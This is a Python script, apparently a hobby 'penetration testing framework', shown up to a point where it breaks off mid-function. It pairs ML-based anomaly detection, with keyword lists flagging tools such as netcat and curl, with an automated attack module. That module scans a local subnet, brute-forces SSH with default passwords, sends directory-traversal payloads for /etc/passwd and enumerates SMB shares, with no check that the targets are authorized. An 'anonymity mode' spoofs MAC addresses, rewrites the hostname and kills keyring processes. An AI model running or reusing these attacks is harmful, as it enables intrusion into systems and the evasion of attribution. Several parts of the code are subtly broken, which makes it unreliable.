#!/usr/bin/env python3
"""
ABYSSAL SECURITY - AI/ML PENETRATION TESTING FRAMEWORK
Advanced machine learning threat detection and automated penetration testing
"""

import os
import sys
import time
import json
import hashlib
import threading
import subprocess
import signal
import socket
import pickle
import numpy as np
import pandas as pd
from datetime import datetime
from pathlib import Path
from collections import defaultdict, deque
import re
import tempfile
import shutil
import logging
from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.svm import OneClassSVM
from sklearn.preprocessing import StandardScaler
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.cluster import DBSCAN
from sklearn.neural_network import MLPClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, confusion_matrix
import psutil
import argparse

# Configuration
CONFIG_DIR = Path.home() / ".config" / "abyssal"
CONFIG_DIR.mkdir(parents=True, exist_ok=True)
MODEL_DIR = CONFIG_DIR / "models"
MODEL_DIR.mkdir(exist_ok=True)
LOG_DIR = CONFIG_DIR / "logs"
LOG_DIR.mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / "abyssal.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class MLThreatDetector:
    """Machine Learning Threat Detection Engine"""
    
    def __init__(self):
        self.models = {}
        self.scalers = {}
        self.feature_extractors = {}
        self.training_data = []
        self.threat_history = deque(maxlen=10000)
        self.baseline_established = False
        self.load_or_train_models()
        
    def load_or_train_models(self):
        """Load existing models or train new ones"""
        try:
            # Try to load existing models
            self.load_models()
            logger.info("Loaded existing ML models")
        except:
            logger.info("Training new ML models...")
            self.train_initial_models()
            self.save_models()
    
    def extract_file_features(self, file_path):
        """Extract ML features from files"""
        features = {}
        
        try:
            stat = file_path.stat()
            
            # Basic file features
            features['size'] = stat.st_size
            features['mode'] = stat.st_mode
            features['uid'] = stat.st_uid
            features['gid'] = stat.st_gid
            features['mtime'] = stat.st_mtime
            features['ctime'] = stat.st_ctime
            features['atime'] = stat.st_atime
            
            # Content features
            try:
                with open(file_path, 'rb') as f:
                    content = f.read(8192)  # First 8KB
                    
                # Entropy features
                byte_counts = defaultdict(int)
                for byte in content:
                    byte_counts[byte] += 1
                
                # Shannon entropy
                entropy = 0.0
                if content:
                    for count in byte_counts.values():
                        p = count / len(content)
                        entropy -= p * np.log2(p) if p > 0 else 0
                
                features['entropy'] = entropy
                
                # Byte frequency features
                for i in range(256):
                    features[f'byte_{i}'] = byte_counts.get(i, 0) / len(content) if content else 0
                
                # String features
                try:
                    text_content = content.decode('utf-8', errors='ignore')
                    features['text_length'] = len(text_content)
                    features['unique_chars'] = len(set(text_content))
                    features['digit_ratio'] = sum(c.isdigit() for c in text_content) / len(text_content) if text_content else 0
                    features['upper_ratio'] = sum(c.isupper() for c in text_content) / len(text_content) if text_content else 0
                    features['space_ratio'] = text_content.count(' ') / len(text_content) if text_content else 0
                    
                    # Suspicious string patterns
                    suspicious_patterns = ['password', 'token', 'key', 'secret', 'admin', 'root', 'exploit', 'shell', 'backdoor']
                    for pattern in suspicious_patterns:
                        features[f'pattern_{pattern}'] = pattern.lower() in text_content.lower()
                        
                except:
                    features['text_length'] = 0
                    features['unique_chars'] = 0
                    features['digit_ratio'] = 0
                    features['upper_ratio'] = 0
                    features['space_ratio'] = 0
                    
            except Exception as e:
                logger.debug(f"Error reading file {file_path}: {e}")
                
        except Exception as e:
            logger.debug(f"Error extracting file features {file_path}: {e}")
            
        return features
    
    def extract_process_features(self, pid):
        """Extract ML features from processes"""
        features = {}
        
        try:
            process = psutil.Process(pid)
            
            # Basic process features
            features['pid'] = pid
            features['ppid'] = process.ppid()
            features['num_threads'] = process.num_threads()
            features['create_time'] = process.create_time()
            
            # Memory features
            memory_info = process.memory_info()
            features['rss'] = memory_info.rss
            features['vms'] = memory_info.vms
            features['shared'] = memory_info.shared
            features['text'] = memory_info.text
            features['lib'] = memory_info.lib
            features['data'] = memory_info.data
            features['dirty'] = memory_info.dirty
            
            # CPU features
            features['cpu_percent'] = process.cpu_percent(interval=0.1)
            features['cpu_times_user'] = process.cpu_times().user
            features['cpu_times_system'] = process.cpu_times().system
            
            # Network features
            try:
                connections = process.connections()
                features['num_connections'] = len(connections)
                features['listening_ports'] = len([c for c in connections if c.status == 'LISTEN'])
                features['established_connections'] = len([c for c in connections if c.status == 'ESTABLISHED'])
                
                # Port features
                ports = [c.laddr.port for c in connections if c.laddr]
                features['min_port'] = min(ports) if ports else 0
                features['max_port'] = max(ports) if ports else 0
                features['mean_port'] = np.mean(ports) if ports else 0
                
            except:
                features['num_connections'] = 0
                features['listening_ports'] = 0
                features['established_connections'] = 0
                features['min_port'] = 0
                features['max_port'] = 0
                features['mean_port'] = 0
            
            # Command line features
            cmdline = process.cmdline()
            features['cmdline_length'] = len(' '.join(cmdline))
            features['num_args'] = len(cmdline)
            
            # Suspicious command patterns
            cmd_str = ' '.join(cmdline).lower()
            suspicious_commands = ['nc', 'netcat', 'ssh', 'telnet', 'ftp', 'wget', 'curl', 'python', 'perl', 'ruby', 'bash', 'sh']
            for cmd in suspicious_commands:
                features[f'cmd_{cmd}'] = cmd in cmd_str
                
            # Parent process features
            try:
                parent = process.parent()
                if parent:
                    features['parent_name'] = hash(parent.name())
                    features['parent_cpu'] = parent.cpu_percent(interval=0.1)
                else:
                    features['parent_name'] = 0
                    features['parent_cpu'] = 0
            except:
                features['parent_name'] = 0
                features['parent_cpu'] = 0
                
        except Exception as e:
            logger.debug(f"Error extracting process features {pid}: {e}")
            
        return features
    
    def extract_network_features(self, connection):
        """Extract ML features from network connections"""
        features = {}
        
        try:
            features['status'] = hash(connection.status)
            features['family'] = connection.family
            features['type'] = connection.type
            
            if connection.laddr:
                features['local_ip'] = hash(connection.laddr.ip)
                features['local_port'] = connection.laddr.port
            else:
                features['local_ip'] = 0
                features['local_port'] = 0
                
            if connection.raddr:
                features['remote_ip'] = hash(connection.raddr.ip)
                features['remote_port'] = connection.raddr.port
            else:
                features['remote_ip'] = 0
                features['remote_port'] = 0
                
            # Port category features
            port_ranges = {
                'well_known': (0, 1023),
                'registered': (1024, 49151),
                'dynamic': (49152, 65535)
            }
            
            for range_name, (start, end) in port_ranges.items():
                if connection.laddr and start <= connection.laddr.port <= end:
                    features[f'local_port_{range_name}'] = 1
                else:
                    features[f'local_port_{range_name}'] = 0
                    
                if connection.raddr and start <= connection.raddr.port <= end:
                    features[f'remote_port_{range_name}'] = 1
                else:
                    features[f'remote_port_{range_name}'] = 0
                    
            # Suspicious port features
            suspicious_ports = [4444, 5555, 6666, 7777, 8888, 9999, 31337, 12345]
            for port in suspicious_ports:
                if connection.laddr and connection.laddr.port == port:
                    features[f'suspicious_local_{port}'] = 1
                else:
                    features[f'suspicious_local_{port}'] = 0
                    
                if connection.raddr and connection.raddr.port == port:
                    features[f'suspicious_remote_{port}'] = 1
                else:
                    features[f'suspicious_remote_{port}'] = 0
                    
        except Exception as e:
            logger.debug(f"Error extracting network features: {e}")
            
        return features
    
    def train_initial_models(self):
        """Train initial ML models"""
        logger.info("Training ML models on system baseline...")
        
        # Collect training data from normal system state
        training_features = []
        
        # File system training data
        logger.info("Collecting file system training data...")
        for file_path in Path('/').rglob('*')[:1000]:  # Limit to 1000 files
            try:
                if file_path.is_file():
                    features = self.extract_file_features(file_path)
                    features['type'] = 'file'
                    features['label'] = 0  # Normal
                    training_features.append(features)
            except:
                continue
                
        # Process training data
        logger.info("Collecting process training data...")
        for process in psutil.process_iter(['pid']):
            try:
                pid = process.info['pid']
                features = self.extract_process_features(pid)
                features['type'] = 'process'
                features['label'] = 0  # Normal
                training_features.append(features)
            except:
                continue
                
        # Network training data
        logger.info("Collecting network training data...")
        connections = psutil.net_connections()
        for conn in connections[:500]:  # Limit to 500 connections
            try:
                features = self.extract_network_features(conn)
                features['type'] = 'network'
                features['label'] = 0  # Normal
                training_features.append(features)
            except:
                continue
        
        if training_features:
            # Convert to DataFrame
            df = pd.DataFrame(training_features)
            
            # Fill NaN values
            df = df.fillna(0)
            
            # Train models for each type
            for data_type in ['file', 'process', 'network']:
                type_data = df[df['type'] == data_type]
                if len(type_data) > 10:
                    X = type_data.drop(['type', 'label'], axis=1, errors='ignore')
                    
                    # Scale features
                    scaler = StandardScaler()
                    X_scaled = scaler.fit_transform(X)
                    
                    # Train Isolation Forest
                    iso_forest = IsolationForest(contamination=0.1, random_state=42)
                    iso_forest.fit(X_scaled)
                    
                    # Train One-Class SVM
                    svm = OneClassSVM(kernel='rbf', gamma='scale', nu=0.1)
                    svm.fit(X_scaled)
                    
                    # Train Random Forest
                    rf = RandomForestClassifier(n_estimators=100, random_state=42)
                    rf.fit(X_scaled, [0] * len(X_scaled))  # All normal data
                    
                    # Save models
                    self.models[f'{data_type}_isolation'] = iso_forest
                    self.models[f'{data_type}_svm'] = svm
                    self.models[f'{data_type}_random_forest'] = rf
                    self.scalers[f'{data_type}'] = scaler
                    
            self.baseline_established = True
            logger.info("ML models trained successfully")
        else:
            logger.warning("No training data collected")
    
    def detect_anomalies(self, features, data_type):
        """Detect anomalies using trained ML models"""
        if not self.baseline_established or data_type not in self.scalers:
            return []
            
        try:
            # Convert to DataFrame
            df = pd.DataFrame([features])
            df = df.fillna(0)
            
            # Remove non-feature columns
            feature_cols = [col for col in df.columns if col not in ['type', 'label']]
            X = df[feature_cols]
            
            # Scale features
            scaler = self.scalers[data_type]
            X_scaled = scaler.transform(X)
            
            anomalies = []
            
            # Isolation Forest
            if f'{data_type}_isolation' in self.models:
                iso_pred = self.models[f'{data_type}_isolation'].predict(X_scaled)[0]
                if iso_pred == -1:
                    anomalies.append("Isolation Forest anomaly")
                    
            # One-Class SVM
            if f'{data_type}_svm' in self.models:
                svm_pred = self.models[f'{data_type}_svm'].predict(X_scaled)[0]
                if svm_pred == -1:
                    anomalies.append("One-Class SVM anomaly")
                    
            # Random Forest
            if f'{data_type}_random_forest' in self.models:
                rf_pred = self.models[f'{data_type}_random_forest'].predict(X_scaled)[0]
                rf_proba = self.models[f'{data_type}_random_forest'].predict_proba(X_scaled)[0]
                if rf_pred == 1 or max(rf_proba) < 0.5:
                    anomalies.append(f"Random Forest anomaly (confidence: {max(rf_proba):.2f})")
                    
            return list(anomalies)
            
        except Exception as e:
            logger.debug(f"Error in anomaly detection: {e}")
            return []
    
    def analyze_file_with_ml(self, file_path):
        """Analyze file using ML models"""
        features = self.extract_file_features(file_path)
        anomalies = self.detect_anomalies(features, 'file')
        
        threats = []
        if anomalies:
            threats.append(f"ML File Anomaly: {file_path} - {'; '.join(anomalies)}")
            
        return threats
    
    def analyze_process_with_ml(self, pid):
        """Analyze process using ML models"""
        features = self.extract_process_features(pid)
        anomalies = self.detect_anomalies(features, 'process')
        
        threats = []
        if anomalies:
            try:
                process = psutil.Process(pid)
                threats.append(f"ML Process Anomaly: {process.name()} (PID {pid}) - {'; '.join(anomalies)}")
            except:
                threats.append(f"ML Process Anomaly: PID {pid} - {'; '.join(anomalies)}")
                
        return threats
    
    def analyze_network_with_ml(self, connection):
        """Analyze network connection using ML models"""
        features = self.extract_network_features(connection)
        anomalies = self.detect_anomalies(features, 'network')
        
        threats = []
        if anomalies:
            threats.append(f"ML Network Anomaly: {connection} - {'; '.join(anomalies)}")
            
        return threats
    
    def save_models(self):
        """Save trained ML models"""
        try:
            for name, model in self.models.items():
                model_path = MODEL_DIR / f"{name}.pkl"
                with open(model_path, 'wb') as f:
                    pickle.dump(model, f)
                    
            for name, scaler in self.scalers.items():
                scaler_path = MODEL_DIR / f"{name}_scaler.pkl"
                with open(scaler_path, 'wb') as f:
                    pickle.dump(scaler, f)
                    
            logger.info("ML models saved successfully")
        except Exception as e:
            logger.error(f"Error saving models: {e}")
    
    def load_models(self):
        """Load trained ML models"""
        try:
            # Load models
            for model_file in MODEL_DIR.glob("*.pkl"):
                if not model_file.name.endswith("_scaler.pkl"):
                    with open(model_file, 'rb') as f:
                        model = pickle.load(f)
                        self.models[model_file.stem] = model
                        
            # Load scalers
            for scaler_file in MODEL_DIR.glob("*_scaler.pkl"):
                with open(scaler_file, 'rb') as f:
                    scaler = pickle.load(f)
                    self.scalers[scaler_file.stem.replace("_scaler", "")] = scaler
                    
            self.baseline_established = True
            logger.info("ML models loaded successfully")
        except Exception as e:
            logger.error(f"Error loading models: {e}")
            raise

class PenetrationTestingFramework:
    """Automated Penetration Testing Framework"""
    
    def __init__(self):
        self.ml_detector = MLThreatDetector()
        self.target_systems = []
        self.exploit_database = self.load_exploit_database()
        self.vulnerability_scanner = VulnerabilityScanner()
        
    def load_exploit_database(self):
        """Load exploit database"""
        # This would typically load from a real exploit database
        # For demo purposes, we'll use a simplified version
        return {
            'ssh_brute_force': {
                'description': 'SSH brute force attack',
                'ports': [22],
                'protocols': ['ssh'],
                'severity': 'high'
            },
            'ftp_anonymous': {
                'description': 'FTP anonymous login check',
                'ports': [21],
                'protocols': ['ftp'],
                'severity': 'medium'
            },
            'web_directory_traversal': {
                'description': 'Web directory traversal',
                'ports': [80, 443, 8080],
                'protocols': ['http', 'https'],
                'severity': 'high'
            },
            'smb_vulnerability': {
                'description': 'SMB vulnerability scan',
                'ports': [445],
                'protocols': ['smb'],
                'severity': 'high'
            }
        }
    
    def scan_network_range(self, network_range):
        """Scan network range for targets"""
        targets = []
        
        # Simple network scanning (would use nmap in production)
        try:
            # Parse network range (simplified)
            if '-' in network_range:
                start_ip, end_ip = network_range.split('-')
                # Generate IP range (simplified)
                for i in range(1, 255):
                    ip = f"192.168.1.{i}"
                    if self.ping_host(ip):
                        targets.append({
                            'ip': ip,
                            'hostname': self.get_hostname(ip),
                            'open_ports': self.scan_ports(ip),
                            'services': self.identify_services(ip)
                        })
        except Exception as e:
            logger.error(f"Network scan error: {e}")
            
        return targets
    
    def ping_host(self, ip):
        """Check if host is up"""
        try:
            result = subprocess.run(['ping', '-c', '1', ip], capture_output=True, text=True, timeout=2)
            return result.returncode == 0
        except:
            return False
    
    def get_hostname(self, ip):
        """Get hostname for IP"""
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname
        except:
            return ip
    
    def scan_ports(self, ip, ports=None):
        """Scan ports on target"""
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 8080, 8443]
            
        open_ports = []
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                continue
                
        return open_ports
    
    def identify_services(self, ip):
        """Identify services on open ports"""
        services = {}
        open_ports = self.scan_ports(ip)
        
        for port in open_ports:
            try:
                service = socket.getservbyport(port)
                services[port] = service
            except:
                services[port] = 'unknown'
                
        return services
    
    def test_vulnerabilities(self, target):
        """Test target for vulnerabilities"""
        vulnerabilities = []
        
        for port, service in target['services'].items():
            # Check exploit database
            for exploit_name, exploit_info in self.exploit_database.items():
                if port in exploit_info['ports'] and service in exploit_info['protocols']:
                    vulnerabilities.append({
                        'target': target['ip'],
                        'port': port,
                        'service': service,
                        'exploit': exploit_name,
                        'description': exploit_info['description'],
                        'severity': exploit_info['severity']
                    })
        
        return vulnerabilities
    
    def exploit_target(self, target, exploit):
        """Attempt to exploit target"""
        results = {
            'target': target['ip'],
            'exploit': exploit,
            'success': False,
            'details': []
        }
        
        try:
            if exploit == 'ssh_brute_force':
                results.update(self.ssh_brute_force(target))
            elif exploit == 'ftp_anonymous':
                results.update(self.ftp_anonymous_check(target))
            elif exploit == 'web_directory_traversal':
                results.update(self.web_directory_traversal(target))
            elif exploit == 'smb_vulnerability':
                results.update(self.smb_vulnerability_check(target))
                
        except Exception as e:
            results['details'].append(f"Exploitation error: {e}")
            
        return results
    
    def ssh_brute_force(self, target):
        """SSH brute force attack"""
        results = {'success': False, 'details': []}
        
        # Common credentials (simplified for demo)
        credentials = [
            ('root', 'root'), ('admin', 'admin'), ('user', 'user'),
            ('root', 'password'), ('admin', 'password'), ('user', 'password')
        ]
        
        for username, password in credentials:
            try:
                # Use ssh to test credentials (simplified)
                cmd = f"ssh -o ConnectTimeout=5 -o BatchMode=no {username}@{target['ip']} 'echo test'"
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10, 
                                      input=f"{password}\n", shell=True)
                
                if result.returncode == 0:
                    results['success'] = True
                    results['details'].append(f"SSH login successful: {username}:{password}")
                    break
                else:
                    results['details'].append(f"SSH login failed: {username}:{password}")
                    
            except Exception as e:
                results['details'].append(f"SSH test error: {e}")
                
        return results
    
    def ftp_anonymous_check(self, target):
        """Check for anonymous FTP access"""
        results = {'success': False, 'details': []}
        
        try:
            import ftplib
            ftp = ftplib.FTP(target['ip'], timeout=5)
            ftp.login('anonymous', 'anonymous@example.com')
            results['success'] = True
            results['details'].append("Anonymous FTP access successful")
            ftp.quit()
        except Exception as e:
            results['details'].append(f"Anonymous FTP access failed: {e}")
            
        return results
    
    def web_directory_traversal(self, target):
        """Test for web directory traversal"""
        results = {'success': False, 'details': []}
        
        # Common directory traversal payloads
        payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd'
        ]
        
        for port in [80, 443, 8080]:
            if port in target['open_ports']:
                protocol = 'https' if port == 443 else 'http'
                for payload in payloads:
                    try:
                        url = f"{protocol}://{target['ip']}:{port}/{payload}"
                        response = subprocess.run(['curl', '-s', '--max-time', '5', url], 
                                              capture_output=True, text=True)
                        
                        if 'root:' in response.stdout or 'localhost' in response.stdout:
                            results['success'] = True
                            results['details'].append(f"Directory traversal successful: {url}")
                            break
                            
                    except Exception as e:
                        results['details'].append(f"Directory traversal test error: {e}")
                        
        return results
    
    def smb_vulnerability_check(self, target):
        """Check for SMB vulnerabilities"""
        results = {'success': False, 'details': []}
        
        try:
            # Use smbclient to check SMB (simplified)
            cmd = f"smbclient -L //{target['ip']} -N"
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10, shell=True)
            
            if result.returncode == 0:
                results['success'] = True
                results['details'].append("SMB share enumeration successful")
                results['details'].append(f"Shares: {result.stdout}")
            else:
                results['details'].append("SMB share enumeration failed")
                
        except Exception as e:
            results['details'].append(f"SMB check error: {e}")
            
        return results
    
    def comprehensive_penetration_test(self, target_range):
        """Run comprehensive penetration test"""
        logger.info(f"Starting penetration test on {target_range}")
        
        # Phase 1: Reconnaissance
        targets = self.scan_network_range(target_range)
        logger.info(f"Found {len(targets)} targets")
        
        # Phase 2: Vulnerability Assessment
        all_vulnerabilities = []
        for target in targets:
            vulns = self.test_vulnerabilities(target)
            all_vulnerabilities.extend(vulns)
            
        logger.info(f"Found {len(all_vulnerabilities)} vulnerabilities")
        
        # Phase 3: Exploitation
        exploit_results = []
        for vuln in all_vulnerabilities:
            target = next(t for t in targets if t['ip'] == vuln['target'])
            result = self.exploit_target(target, vuln['exploit'])
            exploit_results.append(result)
            
        successful_exploits = [r for r in exploit_results if r['success']]
        logger.info(f"Successfully exploited {len(successful_exploits)} targets")
        
        return {
            'targets': targets,
            'vulnerabilities': all_vulnerabilities,
            'exploits': exploit_results,
            'summary': {
                'total_targets': len(targets),
                'total_vulnerabilities': len(all_vulnerabilities),
                'successful_exploits': len(successful_exploits)
            }
        }

class VulnerabilityScanner:
    """Advanced vulnerability scanner"""
    
    def __init__(self):
        self.cve_database = self.load_cve_database()
        
    def load_cve_database(self):
        """Load CVE database (simplified)"""
        return {
            'CVE-2021-44228': {
                'description': 'Log4j Remote Code Execution',
                'affected_services': ['apache', 'log4j'],
                'severity': 'critical'
            },
            'CVE-2021-34527': {
                'description': 'PrintNightmare Windows Print Spooler',
                'affected_services': ['print spooler'],
                'severity': 'critical'
            }
        }
    
    def scan_for_vulnerabilities(self, target):
        """Scan target for known vulnerabilities"""
        vulnerabilities = []
        
        # Check services against CVE database
        for port, service in target['services'].items():
            for cve_id, cve_info in self.cve_database.items():
                if any(affected in service.lower() for affected in cve_info['affected_services']):
                    vulnerabilities.append({
                        'cve_id': cve_id,
                        'description': cve_info['description'],
                        'service': service,
                        'port': port,
                        'severity': cve_info['severity']
                    })
                    
        return vulnerabilities

class AbyssalSecurity:
    """Main AI/ML Security Application"""
    
    def __init__(self):
        self.ml_detector = MLThreatDetector()
        self.config_file = CONFIG_DIR / "config.json"
        self.load_config()
        
    def load_config(self):
        """Load configuration settings"""
        default_config = {
            "real_time_monitoring": True,
            "scan_interval": 15,
            "alert_sound": True,
            "ml_detection": True,
            "anonymity_mode": False,
            "auto_quarantine": False,
            "log_level": "INFO"
        }
        
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    self.config = json.load(f)
            else:
                self.config = default_config
                self.save_config()
        except:
            self.config = default_config
    
    def save_config(self):
        """Save configuration settings"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
    
    def show_banner(self):
        """Display application banner"""
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║          ABYSSAL SECURITY - AI/ML PENETRATION TESTING       ║")
        print("║        Advanced Machine Learning Threat Detection Framework    ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print()
    
    def ml_real_time_monitor(self):
        """ML-powered real-time monitoring"""
        print("🤖 AI/ML REAL-TIME MONITORING ACTIVE")
        print("🧠 Machine Learning threat detection engine running...")
        print("🔍 Scanning with Isolation Forest, One-Class SVM, and Random Forest")
        print("⚡ Press Ctrl+C to stop monitoring")
        print("=" * 70)
        
        alert_count = 0
        
        while True:
            try:
                timestamp = datetime.now().strftime("%H:%M:%S")
                print(f"\n[{timestamp}] 🤖 ML Scanning for anomalies...")
                
                all_threats = []
                
                # ML File System Analysis
                print("  📁 ML File System Analysis...")
                for file_path in list(Path('/tmp').rglob('*'))[:50]:  # Limit for performance
                    try:
                        threats = self.ml_detector.analyze_file_with_ml(str(file_path))
                        all_threats.extend(threats)
                    except:
                        continue
                
                # ML Process Analysis
                print("  🔧 ML Process Analysis...")
                processes = list(psutil.process_iter(['pid']))[:50]  # Convert to list first
                for process in processes:
                    try:
                        pid = process.info['pid']
                        threats = self.ml_detector.analyze_process_with_ml(pid)
                        all_threats.extend(threats)
                    except:
                        continue
                
                # ML Network Analysis
                print("  🌐 ML Network Analysis...")
                connections = list(psutil.net_connections())[:50]  # Convert to list first
                for conn in connections:
                    try:
                        threats = self.ml_detector.analyze_network_with_ml(conn)
                        all_threats.extend(threats)
                    except:
                        continue
                
                if all_threats:
                    alert_count += len(all_threats)
                    print(f"\n🚨🚨🚨 ML THREATS DETECTED! 🚨🚨🚨")
                    print(f"🧠 {len(all_threats)} ML anomaly(ies) found:")
                    
                    for i, threat in enumerate(all_threats[:10], 1):
                        print(f"   {i}. {threat}")
                        
                    if len(all_threats) > 10:
                        print(f"   ... and {len(all_threats) - 10} more ML anomalies")
                    
                    # Play alert sound
                    self._play_alert_sound()
                    
                    print(f"📊 Total ML alerts this session: {alert_count}")
                    print("=" * 70)
                else:
                    print("✅ No ML anomalies detected - System secure")
                    
                time.sleep(15)  # Scan every 15 seconds
                
            except KeyboardInterrupt:
                print(f"\n\n⚠️  ML monitoring stopped by user")
                break
            except Exception as e:
                print(f"\n❌ ML monitoring error: {e}")
                time.sleep(5)
                
        print(f"\n📊 Final ML alert count: {alert_count}")
    
    def run_ml_comprehensive_scan(self):
        """Run comprehensive ML security scan"""
        print("🤖 COMPREHENSIVE ML SECURITY SCAN")
        print("=" * 50)
        
        # ML File System Scan
        print("📁 ML File System Scan...")
        file_threats = []
        try:
            # Get all files first
            all_files = list(Path('/tmp').rglob('*'))
            total_files = len(all_files)
            print(f"   Found {total_files} files to scan...")
            
            scan_count = 0
            for file_path in all_files:
                scan_count += 1
                if scan_count % 50 == 0 or scan_count == total_files:
                    print(f"   Scanned {scan_count}/{total_files} files...")
                    
                try:
                    with open(file_path, 'rb') as f:
                        threats = self.ml_detector.analyze_file_with_ml(str(file_path))
                        if threats:
                            file_threats.extend(threats)
                except:
                    continue
                    
            print(f"   Completed: Scanned {scan_count} files")
            print(f"   ML file threats: {len(file_threats)}")
            
        except Exception as e:
            print(f"   ❌ File scan error: {e}")
        
        # ML Process Scan
        print("\n🔧 ML Process Scan...")
        process_threats = []
        try:
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    threats = self.ml_detector.analyze_process_with_ml(proc.info['pid'])
                    if threats:
                        process_threats.extend(threats)
                except:
                    continue
                    
            print(f"   ML process threats: {len(process_threats)}")
            
        except Exception as e:
            print(f"   ❌ Process scan error: {e}")
        
        # ML Network Scan
        print("\n🌐 ML Network Scan...")
        network_threats = []
        try:
            for conn in psutil.net_connections():
                try:
                    threats = self.ml_detector.analyze_network_with_ml(conn)
                    if threats:
                        network_threats.extend(threats)
                except:
                    continue
                    
            print(f"   ML network threats: {len(network_threats)}")
            
        except Exception as e:
            print(f"   ❌ Network scan error: {e}")
        
        # Summary
        print("\n📊 ML SCAN SUMMARY")
        print("=" * 50)
        print(f"   File anomalies: {len(file_threats)}")
        print(f"   Process anomalies: {len(process_threats)}")
        print(f"   Network anomalies: {len(network_threats)}")
        
        all_threats = file_threats + process_threats + network_threats
        
        if all_threats:
            print(f"\n⚠️  ML ANOMALIES DETECTED:")
            for i, threat in enumerate(all_threats[:20], 1):
                print(f"   {i}. {threat}")
        else:
            print("\n✅ No ML anomalies detected - System secure")
    
    def run_anonymity_mode(self):
        """Activate anonymity mode for pentesters"""
        print("👤 ANONYMITY MODE ACTIVATED")
        print("=" * 50)
        
        try:
            # Start Tor service
            print("🔧 Starting Tor service...")
            result = subprocess.run(['sudo', 'systemctl', 'start', 'tor'], capture_output=True, text=True)
            if result.returncode == 0:
                print("✅ Tor service started")
            else:
                print("⚠️  Tor service failed to start")
            
            # Randomize MAC address
            print("🔧 Randomizing MAC address...")
            interfaces = psutil.net_if_addrs()
            for interface in interfaces:
                if interface != 'lo' and interface.startswith(('eth', 'wlan', 'enp')):
                    try:
                        # Generate random MAC
                        import random
                        mac = "02:%02x:%02x:%02x:%02x:%02x" % (
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255)
                        )
                        
                        # Change MAC address
                        subprocess.run(['sudo', 'ifconfig', interface, 'down'], check=True)
                        subprocess.run(['sudo', 'ifconfig', interface, 'hw', 'ether', mac], check=True)
                        subprocess.run(['sudo', 'ifconfig', interface, 'up'], check=True)
                        print(f"✅ MAC address randomized for {interface}: {mac}")
                    except:
                        print(f"❌ Failed to randomize MAC for {interface}")
            
            # Change hostname
            print("🔧 Changing hostname...")
            import random
            import string
            hostname = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            
            try:
                subprocess.run(['sudo', 'hostname', hostname], check=True)
                with open('/etc/hostname', 'w') as f:
                    f.write(hostname + '\n')
                print(f"✅ Hostname changed to: {hostname}")
            except:
                print("❌ Failed to change hostname")
            
            # Clear DNS cache
            print("🔧 Clearing DNS cache...")
            try:
                subprocess.run(['sudo', 'systemd-resolve', '--flush-caches'], check=True)
                print("✅ DNS cache cleared")
            except:
                print("❌ Failed to clear DNS cache")
            
            # Kill identifying processes
            print("🔧 Terminating identifying processes...")
            dangerous_processes = ['gnome-keyring-daemon', 'kwalletd5', 'secret-service']
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'] in dangerous_processes:
                        proc.kill()
                        print(f"✅ Terminated: {proc.info['name']}")
                except:
                    continue
            
            # Set proxy environment variables
            print("🔧 Setting up proxy environment...")
            proxy_vars = {
                'HTTP_PROXY': 'http://127.0.0.1:9050',
                'HTTPS_PROXY': 'http://127.0.0.1:9050',
                'FTP_PROXY': 'http://127.0.0.1:9050',
                'SOCKS_PROXY': 'socks5://127.0.0.1:9050'
            }
            
            for var, value in proxy_vars.items():
                os.environ[var] = value
                print(f"✅ Set {var}={value}")
            
            print("\n🎭 ANONYMITY MODE ACTIVE")
            print("🔐 Your identity is now protected")
            print("🌐 All traffic routed through Tor")
            print("🔧 MAC address randomized")
            print("🏷️  Hostname changed")
            print("🗑️  DNS cache cleared")
            print("🔑 Keyring processes terminated")
            print("⚠️  Remember: Stay anonymous and stay safe!")
            
        except Exception as e:
            print(f"❌ Anonymity mode error: {e}")
    
    def check_anonymity_status(self):
        """Check current anonymity status"""
        print("🔍 ANONYMITY STATUS CHECK")
        print("=" * 50)
        
        # Check Tor status
        try:
            result = subprocess.run(['sudo', 'systemctl', 'is-active', 'tor'], capture_output=True, text=True)
            if 'active' in result.stdout:
                print("✅ Tor service is active")
            else:
                print("❌ Tor service is not active")
        except:
            print("❌ Cannot check Tor status")
        
        # Check MAC addresses
        print("\n🔧 Current MAC addresses:")
        interfaces = psutil.net_if_addrs()
        for interface in interfaces:
            if interface != 'lo' and interface.startswith(('eth', 'wlan', 'enp')):
                try:
                    result = subprocess.run(['ifconfig', interface], capture_output=True, text=True)
                    for line in result.stdout.split('\n'):
                        if 'ether' in line:
                            mac = line.split('ether')[1].strip().split()[0]
                            print(f"   {interface}: {mac}")
                            break
                except:
                    print(f"   {interface}: Unknown")
        
        # Check hostname
        try:
            hostname = socket.gethostname()
            print(f"\n🏷️  Current hostname: {hostname}")
        except:
            print("\n🏷️  Hostname: Unknown")
        
        # Check proxy environment
        print("\n🌐 Proxy environment:")
        proxy_vars = ['HTTP_PROXY', 'HTTPS_PROXY', 'FTP_PROXY', 'SOCKS_PROXY']
        for var in proxy_vars:
            value = os.environ.get(var, 'Not set')
            print(f"   {var}: {value}")
        
        # Check for identifying processes
        print("\n🔑 Identifying processes:")
